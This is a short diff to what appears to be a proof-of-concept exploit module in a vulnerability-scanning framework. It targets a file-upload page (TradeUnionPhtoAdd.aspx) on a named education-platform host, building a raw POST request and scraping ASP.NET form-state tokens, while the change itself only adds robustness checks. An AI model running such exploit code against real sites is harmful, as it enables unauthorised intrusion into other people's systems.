@@ -21,7 +21,10 @@ class Vuln(ABVuln):
     product_version = 'Unkonwn'  # 漏洞应用版本
 
 def com_pack(state):
-    return '''
+    if len(state) < 2:
+        return ""
+    else:
+        return '''
 POST /EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx HTTP/1.1
 Host: i.goodo.com.cn
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0
@@ -68,9 +71,11 @@ def getViewState(url):
     if code == 200:
         the_list = []
         buff_list = re.findall('<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="(.*?)" />', res)
-        the_list.append(buff_list[0])
+        if buff_list:
+            the_list.append(buff_list[0])
         buff_list = re.findall('<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="(.*?)" />', res)
-        the_list.append(buff_list[0])
+        if buff_list:
+            the_list.append(buff_list[0])
         return the_list
 
 class Poc(ABPoc):
